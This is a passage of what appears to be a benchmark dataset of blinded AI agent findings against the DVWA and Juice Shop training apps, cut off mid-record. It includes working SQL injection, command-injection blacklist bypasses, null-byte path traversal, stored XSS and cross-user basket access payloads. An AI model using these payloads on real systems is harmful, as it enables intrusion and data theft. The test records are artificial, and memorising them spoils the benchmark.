+    "response_evidence": "Direct request to /ftp/package.json.bak returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' thrown by the verify() middleware in fileServer.js:55, confirming the extension filter blocks the restricted .bak file. Appending a URL-encoded null byte plus an allowed extension (%2500.md) bypassed this filter: GET /ftp/package.json.bak%2500.md returned HTTP 200 with content-type application/octet-stream and the full contents of the restricted package.json backup file (visible fields: name 'juice-shop', version '6.2.0-SNAPSHOT', dependencies list, etc.), proving the poison null-byte path traversal/filter bypass.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0076",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via unsanitized 'ip' parameter in DVWA Command Injection page (low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ form_data={ip: '127.0.0.1; whoami', Submit: 'Submit'} (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=low] Response pre-block contained normal ping output for 127.0.0.1 followed by the injected command's output on its own line: 'www-data'. Full captured output: 'PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. ... --- 127.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3104ms rtt min/avg/max/mdev = 0.042/0.190/0.625/0.250 ms\\nwww-data'. The appearance of the web server process identity 'www-data' confirms the injected ';whoami' command was executed by the underlying shell, proving unsanitized shell metacharacter injection via the ip parameter.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0077",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in DVWA SQLi page (id parameter) - low security",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit (session=dvwa_admin)",
+      "GET http://dvwa/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%272&Submit=Submit (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=low] TRUE payload id=1' OR '1'='1 returned 5 full user records (First name/Surname pairs): admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith. FALSE payload id=1' AND '1'='2 returned zero records (page shows only 'User ID:' with no First name/Surname rows). This confirms the id parameter is concatenated unsanitized into the backend SQL query, allowing boolean-based injection that alters result set cardinality.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0078",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/basket/{id}",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-639",
+    "title": "Cross-User Basket Access (BOLA) via /rest/basket/{id} — no ownership check",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/basket/6 (session=juiceshop_acct1) -> 200, returns acct1's own basket: id=6, UserId=22, Products=[Apple Juice (1000ml) qty=3]",
+      "GET http://juiceshop:3000/rest/basket/1 (session=juiceshop_acct2, acct2's own_basket_id=7) -> 200, returns basket id=1, UserId=1 (NOT acct2's account), Products=[Apple Juice (1000ml) qty=2, Orange Juice (1000ml) qty=3, Eggfruit Juice (500ml) qty=1]"
+    ],
+    "response_evidence": "juiceshop_acct2 (own_basket_id=7, email=acct2_bench@juiceshop.local) successfully retrieved basket ID 1, which belongs to UserId=1 (not acct2's own user). The response disclosed the full distinct seeded basket contents belonging to a different account: Apple Juice (1000ml) qty=2, Orange Juice (1000ml) qty=3, Eggfruit Juice (500ml) qty=1 — none of which match acct2's own seeded basket (id=7). This confirms the /rest/basket/{id} endpoint performs no server-side ownership/authorization check, allowing any authenticated user to read any other user's basket contents by ID (IDOR/BOLA).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0079",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Open Directory Listing on /ftp/ exposing confidential acquisitions.md memo",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ HTTP/1.1  Accept: text/html,application/json",
+      "GET http://juiceshop:3000/ftp/acquisitions.md HTTP/1.1"
+    ],
+    "response_evidence": "1) GET /ftp/ returned HTTP 200 with a serve-index directory listing (visible_text): 'listing directory /ftp/ ... acquisitions.md 909 ... announcement_encrypted.md 369237 ... coupons_2013.md.bak 131 ... package.json.bak 4291 ... suspicious_errors.yml 723'. This confirms the open directory listing exposes acquisitions.md and the .bak files (package.json.bak, coupons_2013.md.bak).\n2) GET /ftp/acquisitions.md returned HTTP 200, content-type text/markdown, with body excerpt: '# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year. This will have a significant stock market impact...' confirming the confidential acquisition memo is directly retrievable due to the exposed directory listing.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0080",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via numeric boolean bypass in 'id' POST field (DVWA security=medium)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin, security=medium cookie) with form_data={id: '1 OR 1=1', Submit: 'Submit'}  -- TRUE condition",
+      "POST http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin, security=medium cookie) with form_data={id: '1 AND 1=2', Submit: 'Submit'}  -- FALSE condition"
+    ],
+    "response_evidence": "[security=medium] Footer confirms 'Security Level: medium'. TRUE payload id='1 OR 1=1' returned FIVE seeded user records (multiple surnames), proving the numeric value is concatenated unsanitized into the SQL query without quotes: pre_blocks = [\"ID: 1 OR 1=1\\nFirst name: admin\\nSurname: admin\", \"ID: 1 OR 1=1\\nFirst name: Gordon\\nSurname: Brown\", \"ID: 1 OR 1=1\\nFirst name: Hack\\nSurname: Me\", \"ID: 1 OR 1=1\\nFirst name: Pablo\\nSurname: Picasso\", \"ID: 1 OR 1=1\\nFirst name: Bob\\nSurname: Smith\"]. FALSE payload id='1 AND 1=2' returned ZERO records (empty pre_blocks, visible_text shows only the User ID selector with no 'ID:'/'First name:'/'Surname:' rows). The TRUE/FALSE differential confirms classic boolean-based SQL injection on the medium-level numeric id field.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0081",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection in DVWA Command Injection page (high security) via unspaced pipe bypass",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/exec/ (session=dvwa_admin) -> 200, confirmed Security Level: high in footer",
+      "POST http://dvwa/vulnerabilities/exec/ (session=dvwa_admin) body: ip=127.0.0.1|whoami&Submit=Submit"
+    ],
+    "response_evidence": "[security=high] Payload ip=127.0.0.1|whoami (pipe with NO trailing space, bypassing high-level blacklist of '; ', '| ', and '&&') submitted to POST /vulnerabilities/exec/. Response visible_text/pre_blocks contains the command output \"www-data\" immediately following the ping output area: pre_blocks=[\"www-data\"], and footer confirms Security Level: high. This proves the injected `whoami` command executed server-side and disclosed the web server process identity (www-data), satisfying the confirmed criterion.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0082",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via pipe (no trailing space) bypass of blacklist at DVWA high security",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "[security=high] POST http://dvwa/vulnerabilities/exec/  form_data={ip: \"127.0.0.1|whoami\", Submit: Submit}  (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=high] Response page footer explicitly states 'Security Level: high'. Submitting ip=127.0.0.1|whoami (pipe character immediately followed by command, no space, bypassing the high-level blacklist of '; ', '| ' with trailing space, and '&&') produced visible_text containing 'Enter an IP address: www-data' and a dedicated pre_block entry with exact content 'www-data' -- confirming the piped whoami command executed server-side and returned the web-server process identity, proving OS command injection at DVWA high security.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0083",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/basket/6",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-639",
+    "title": "Cross-User Basket Access (BOLA) — acct2 retrieves acct1's basket id=6",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/basket/6 (session=juiceshop_acct1) -> own_basket_id=6, UserId=22, Products=[Apple Juice (1000ml) qty=3, BasketItem id=9] [established in prior mapping pass]",
+      "GET http://juiceshop:3000/rest/basket/6 (session=juiceshop_acct2, own_basket_id=7) -> HTTP 200"
+    ],
+    "response_evidence": "Authenticated as juiceshop_acct2 (own_basket_id=7, confirming acct2 has a distinct basket of its own), a GET to /rest/basket/6 returned HTTP 200 with body: {\\\"status\\\":\\\"success\\\",\\\"data\\\":{\\\"id\\\":6,\\\"coupon\\\":null,\\\"UserId\\\":22,...,\\\"Products\\\":[{\\\"id\\\":1,\\\"name\\\":\\\"Apple Juice (1000ml)\\\",...,\\\"BasketItem\\\":{\\\"ProductId\\\":1,\\\"BasketId\\\":6,\\\"id\\\":9,\\\"quantity\\\":3,...}}]}}. This is Account 1's basket (UserId=22) and its distinct seeded item (Apple Juice 1000ml, qty=3, BasketItem id=9) — matching exactly what was previously observed when querying as acct1 itself. No ownership/ACL check is enforced on /rest/basket/:id, confirming BOLA. This finding corroborates and finalizes the already-confirmed finding at juiceshop:GET:/rest/basket/6.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0084",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/package.json.bak%2500.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-22",
+    "title": "Poison Null-Byte Path Traversal bypasses file-extension filter on /ftp/ endpoint",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/package.json.bak (unauth)",
+      "GET http://juiceshop:3000/ftp/package.json.bak%2500.md (unauth)"
+    ],
+    "response_evidence": "Step 1: GET /ftp/package.json.bak returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' (fileServer.js:55 verify middleware), confirming the extension allow-list blocks direct .bak retrieval.\\nStep 2: GET /ftp/package.json.bak%2500.md (URL-encoded null byte + allowed .md extension) returned HTTP 200 with content_type application/octet-stream and full file content of the restricted package.json.bak file, e.g.:\\n'{\\n  \\\"name\\\": \\\"juice-shop\\\",\\n  \\\"version\\\": \\\"6.2.0-SNAPSHOT\\\",\\n  \\\"description\\\": \\\"An intentionally insecure JavaScript Web Application\\\", ... \\\"dependencies\\\": {...} ...}'\\nThis proves the null-byte sequence truncates the filename check after validating the .md extension but the underlying filesystem read (legacy Node C++ null-terminated string handling) retrieves the original .bak file, bypassing the extension filter entirely. Both the 403 on raw path and 200-with-content on bypassed path were demonstrated, satisfying confirmation criteria.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0085",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via pipe bypass of ';' / '&&' blacklist (medium)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/security.php (dvwa_admin) -> confirmed 'Security Level: medium' in visible_text",
+      "POST http://dvwa/vulnerabilities/exec/ (dvwa_admin) form_data={ip: '127.0.0.1| whoami', Submit: 'Submit'}"
+    ],
+    "response_evidence": "[security=medium] Page confirmed 'Security Level: medium' prior to testing. Payload ip=127.0.0.1| whoami (pipe with trailing space) bypassed the medium-level blacklist (which strips ';' and '&&' via str_replace but not '|'). Response visible_text included: \"Enter an IP address: www-data\" and pre_blocks returned exactly [\"www-data\"], confirming execution of the injected `whoami` command returning the web-process identity www-data.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0086",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "DVWA SQL Injection via unescaped quoted 'id' parameter [security=low]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit (dvwa_admin, security=low)",
+      "GET http://dvwa/vulnerabilities/sqli/?id=1' AND '1'='2&Submit=Submit (dvwa_admin, security=low)"
+    ],
+    "response_evidence": "[security=low] TRUE payload id=1' OR '1'='1 returned 5 rows (multiple seeded users), verbatim: \\\"ID: 1' OR '1'='1 First name: admin Surname: admin\\\", \\\"First name: Gordon Surname: Brown\\\", \\\"First name: Hack Surname: Me\\\", \\\"First name: Pablo Surname: Picasso\\\", \\\"First name: Bob Surname: Smith\\\". FALSE payload id=1' AND '1'='2 returned zero records (visible_text shows only \\\"User ID:\\\" with no First name/Surname lines, pre_blocks empty). This TRUE-multiple-rows vs FALSE-zero-rows differential confirms the id parameter is concatenated unsanitized into the SQL query, demonstrating classic UNION/boolean-based SQL injection.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0087",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via pipe bypass on ip parameter at medium security level",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ form_data={ip: '127.0.0.1| whoami', Submit: 'Submit'} (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=medium] Payload ip='127.0.0.1| whoami' (pipe, bypassing the medium-level blacklist of ';' and '&&') produced response pre_blocks: [\"www-data\"], and visible_text includes \"Enter an IP address: www-data\" with no ping output shown, indicating the injected whoami command executed and returned the web server process identity. Page confirms \"Security Level: medium\".",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0088",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/session-input.php",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via out-of-band session-input id field on DVWA sqli (high security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) -> form fields id, Submit",
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) form_data={id: \"1' OR '1'='1' #\", Submit: 'Submit'} -> stores Session ID in server session",
+      "GET http://dvwa/vulnerabilities/sqli/?Submit=Submit (session=dvwa_admin) -> TRUE result set returned",
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) form_data={id: \"1' AND '1'='2' #\", Submit: 'Submit'} -> stores Session ID in server session",
+      "GET http://dvwa/vulnerabilities/sqli/?Submit=Submit (session=dvwa_admin) -> FALSE result set returned"
+    ],
+    "response_evidence": "[security=high] At high security the 'id' is submitted out-of-band via session-input.php and the underlying query appends 'LIMIT 1', requiring a trailing comment to neutralize it. TRUE payload id=1' OR '1'='1' # produced multiple seeded user surnames on subsequent GET /vulnerabilities/sqli/?Submit=Submit: 'ID: 1' OR '1'='1' # First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith' (5 records, bypassing LIMIT 1 because the OR condition makes every row match and the UNION-less OR with comment neutralizes the trailing LIMIT clause injection point). FALSE payload id=1' AND '1'='2' # produced zero records: the subsequent GET /vulnerabilities/sqli/?Submit=Submit response contained no 'ID:' result blocks (only the static page chrome, pre_blocks absent). Page confirmed 'Security Level: high' throughout.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0089",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/session-input.php",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via out-of-band session-input.php id parameter (DVWA high security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php  body: id=1' OR '1'='1' # & Submit=Submit",
+      "GET http://dvwa/vulnerabilities/sqli/",
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php  body: id=1' AND '1'='2' # & Submit=Submit",
+      "GET http://dvwa/vulnerabilities/sqli/"
+    ],
+    "response_evidence": "[security=high] Confirmed TRUE/FALSE boolean-based SQLi behavior. Footer explicitly shows 'Security Level: high' on both the exec and sqli pages during this test sequence.\n\nTRUE payload id=1' OR '1'='1' # (stored out-of-band via session-input.php, then rendered by GET /vulnerabilities/sqli/) returned 5 seeded user records:\n  ID: 1' OR '1'='1' # First name: admin Surname: admin\n  ID: 1' OR '1'='1' # First name: Gordon Surname: Brown\n  ID: 1' OR '1'='1' # First name: Hack Surname: Me\n  ID: 1' OR '1'='1' # First name: Pablo Surname: Picasso\n  ID: 1' OR '1'='1' # First name: Bob Surname: Smith\n\nFALSE payload id=1' AND '1'='2' # (stored via session-input.php, then rendered by GET /vulnerabilities/sqli/) returned zero records: page body contained only 'Click here to change your ID .' with no pre_blocks/result rows present.\n\nThis confirms the id value is consumed out-of-band from session state and concatenated unsanitized into the backend SQL query (requiring the trailing '#' comment to neutralize the appended LIMIT 1 clause), consistent with the high-security SQLi behavior.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0090",
+    "target": "juiceshop",
+    "endpoint_url": "/encryptionkeys/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-548",
+    "title": "Exposed Encryption Keys Directory Listing (/encryptionkeys/)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/encryptionkeys/ Accept: text/html,application/json -> HTTP 200, listing jwt.pub (248B) and premium.key (50B)",
+      "GET http://juiceshop:3000/encryptionkeys/premium.key -> HTTP 200, body: 1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42",
+      "GET http://juiceshop:3000/encryptionkeys/jwt.pub -> HTTP 200, body: -----BEGIN RSA PUBLIC KEY----- MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE= -----END RSA"
+    ],
+    "response_evidence": "GET /encryptionkeys/ returned HTTP 200 with a serve-index listing exposing 'jwt.pub 248' and 'premium.key 50'. Both files were then retrieved directly: /encryptionkeys/premium.key returned HTTP 200 with content '1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42', and /encryptionkeys/jwt.pub returned HTTP 200 with a full PEM-encoded RSA public key block, confirming unauthenticated exposure of sensitive cryptographic key material via a browsable directory.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0091",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection in DVWA Command Injection page (security=medium) via pipe bypass of ';' and '&&' blacklist",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/security.php (session=dvwa_admin) -> confirmed security_level=medium",
+      "POST http://dvwa/vulnerabilities/exec/ body: ip=127.0.0.1| whoami&Submit=Submit (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=medium] Payload ip=127.0.0.1| whoami bypassed the medium-level blacklist (which blocks ';' and '&&' but not a bare pipe '|'). Response pre_blocks field contained exactly \"www-data\", and visible_text shows \"Enter an IP address: www-data\" confirming the whoami command executed server-side and disclosed the web-process identity. DVWA security_level confirmed as 'medium' via session_info on the request.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0092",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/api/Feedbacks",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-359",
+    "title": "Unauthenticated access to /api/Feedbacks discloses user feedback records with PII (partial emails + UserId linkage)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/api/Feedbacks (unauth, no Authorization header)"
+    ],
+    "response_evidence": "GET /api/Feedbacks with NO authentication returned HTTP 200 with JSON body containing 8 feedback records. Records include UserId associations (1,2,3,21) linking feedback to specific registered user accounts, and comment text embeds partially-masked but recoverable email address fragments disclosing the author's email domain and trailing characters, e.g.:\\n- UserId 1: \\\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\\\"\\n- UserId 2: \\\"Great shop! Awesome service! (***@juice-sh.op)\\\"\\n- UserId 3: \\\"Nothing useful available here! (***der@juice-sh.op)\\\"\\n- UserId 21: \\\"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : '<seed phrase>' (***ereum@juice-sh.op)\\\" -- this record additionally leaks what appears to be a cryptocurrency wallet seed phrase.\\nNo authentication token or session cookie was supplied in the request, and the endpoint did not reject the request (no 401/403), confirming this data (user-to-feedback linkage via UserId, partial email PII, and embedded sensitive seed-phrase text) is exposed to anonymous/unauthenticated callers, violating access control expectations (CWE-359).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0093",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/basket/6",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-639",
+    "title": "Broken Object Level Authorization (BOLA) on Basket Retrieval Endpoint",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/basket/6  (session=juiceshop_acct1, own_basket_id=6)",
+      "GET http://juiceshop:3000/rest/basket/6  (session=juiceshop_acct2, own_basket_id=7)"
+    ],
+    "response_evidence": "As acct1 (own_basket_id=6), GET /rest/basket/6 returned HTTP 200 with basket UserId:22, Products: [{name:'Apple Juice (1000ml)', BasketItem:{BasketId:6, id:9, quantity:3}}] — this is acct1's own distinct seeded basket. Then, authenticated as juiceshop_acct2 (whose own_basket_id is 7, a different basket), requesting the SAME URL GET /rest/basket/6 also returned HTTP 200 with the IDENTICAL body: UserId:22, Products:[{name:'Apple Juice (1000ml)', BasketItem:{BasketId:6, id:9, quantity:3}}]. acct2 successfully retrieved acct1's basket contents (product 'Apple Juice (1000ml)', quantity 3) despite not owning basket id 6, with no authorization/ownership check enforced by the server — confirming cross-user BOLA.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0094",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/basket/6",
+    "method": "GET",
+    "parameter": "id (path)",
+    "cwe": "CWE-639",
+    "title": "Cross-User Basket Access (BOLA) - acct2 can read acct1's basket",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/basket/6  (Authorization: Bearer <juiceshop_acct2 JWT>, session=juiceshop_acct2 whose own_basket_id=7)"
+    ],
+    "response_evidence": "HTTP 200 returned for basket id=6 while authenticated as acct2 (own basket id=7). Response body: {\"status\":\"success\",\"data\":{\"id\":6,\"coupon\":null,\"UserId\":22,...,\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",...,\"BasketItem\":{\"ProductId\":1,\"BasketId\":6,\"id\":9,\"quantity\":3,...}}]}} — this is acct1's basket (UserId 22) containing the distinct seeded product 'Apple Juice (1000ml)' qty 3, successfully retrieved by a different authenticated user (acct2) with no authorization check preventing cross-user access.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0095",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via unsanitized 'id' parameter in DVWA SQLi page [security=low]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit  (session=dvwa_admin, security=low)",
+      "GET http://dvwa/vulnerabilities/sqli/?id=1' AND '1'='2&Submit=Submit  (session=dvwa_admin, security=low)"
+    ],
+    "response_evidence": "[security=low] TRUE payload (id=1' OR '1'='1) returned 5 user records: Surnames 'admin', 'Brown', 'Me', 'Picasso', 'Smith' (First names: admin, Gordon, Hack, Pablo, Bob) — i.e. the entire users table was dumped via boolean bypass of the quoted WHERE clause. FALSE payload (id=1' AND '1'='2) returned zero records (page body contained only 'User ID:' with no pre_blocks / no First name-Surname entries). This TRUE-returns-many / FALSE-returns-none behavioral differential confirms classic string-context SQL injection in the 'id' parameter at low security.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0096",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored XSS in DVWA Guestbook (mtxMessage field) - low security",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'test', mtxMessage: '<script id=\"test_token\">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'} (session=dvwa_admin) -- note: client-side maxlength=50 was bypassed via direct POST since the 51-char payload exceeds maxlength but is enfo",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (session=dvwa_admin)",
+      "browser_eval_js('window.xss_flag')",
+      "browser_read_dom('#test_token')"
+    ],
+    "response_evidence": "[security=low] After submitting the payload, the guestbook page no longer rendered the message as visible text (script content is non-visible), but on re-navigation the injected <script id=\\\"test_token\\\"> tag was present and executed in the page DOM.",
+    "browser_js_evidence": "browser_eval_js(\\\"window.xss_flag\\\") returned 1. browser_read_dom(\\\"#test_token\\\") returned inner_text/inner_html \\\"window.xss_flag=1\\\", confirming the injected <script id=\\\"test_token\\\"> tag was stored and executed as live JavaScript in the authenticated admin browser context when loading /vulnerabilities/xss_s/, proving persistent/stored XSS."
+  },
+  {
+    "blind_id": "BLIND-0097",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via pipe bypass at DVWA medium security (exec)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ (session=dvwa_admin) form_data={ip: '127.0.0.1| whoami', Submit: 'Submit'}"
+    ],
+    "response_evidence": "[security=medium] Page confirms 'Security Level: medium'. Payload ip=127.0.0.1| whoami bypassed the medium-level blacklist (which only strips ';' and '&&', not '|'). Response visible_text included 'Enter an IP address: www-data' and pre_blocks returned exactly ['www-data'], confirming command execution as the web-server identity www-data.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0098",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via unsanitized 'id' parameter in DVWA SQLi page [security=low]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit (session=dvwa_admin)",
+      "GET http://dvwa/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%272&Submit=Submit (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=low] TRUE payload id=1' OR '1'='1 returned 5 user records (multiple seeded surnames): ID:1' OR '1'='1 First name: admin Surname: admin; First name: Gordon Surname: Brown; First name: Hack Surname: Me; First name: Pablo Surname: Picasso; First name: Bob Surname: Smith. FALSE payload id=1' AND '1'='2 returned zero records (page visible_text only shows 'User ID:' prompt with no 'ID:'/'First name:'/'Surname:' rows). This differential behavior (5 rows vs 0 rows) confirms the 'id' GET parameter is concatenated unsanitized into the backend SQL query, enabling boolean-based SQL injection.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0099",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Confidential acquisitions memo retrievable via open /ftp/ directory",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/acquisitions.md (unauth)"
+    ],
+    "response_evidence": "HTTP 200, content-type text/markdown. Body excerpt: '# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail in the following paragraph: ...'. Direct retrieval of the confidential acquisition memo succeeded without authentication, confirming CWE-200 exposure.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0100",
+    "target": "juiceshop",
+    "endpoint_url": "/api/Feedbacks",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-359",
+    "title": "Unauthenticated Access to /api/Feedbacks Discloses User PII (emails, UserId linkage)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/api/Feedbacks (unauth, no Authorization header)"
+    ],
